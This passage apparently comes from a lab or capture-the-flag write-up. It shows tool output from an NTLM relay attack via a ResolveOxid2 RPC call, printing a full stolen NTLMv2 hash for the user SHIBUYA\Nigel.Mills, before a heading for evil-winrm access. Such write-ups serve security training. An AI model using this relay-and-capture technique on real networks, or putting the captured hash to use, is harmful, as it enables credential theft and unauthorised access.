[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 8888
[+] User hash stolen!

NTLMv2 Client   : AWSJPDC0522
NTLMv2 Username : SHIBUYA\Nigel.Mills
NTLMv2 Hash     : Nigel.Mills::SHIBUYA:cbbd010b1adcb705:3f982e160657259d25024f8fe3794f4c:0101000000000000b89805ccc48bdc016bb84702d89454140000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c0007000800b89805ccc48bdc0106000400060000000800300030000000000000000100000000200000a604a2833f968daccd1cafe5f327ef02f16173b70e6f9876adab1f882f2f5dd10a00100000000000000000000000000000000000090000000000000000000000
```

### evil-winrm

![Pasted image 20260124010749.png](/ob/Pasted%20image%2020260124010749.png)
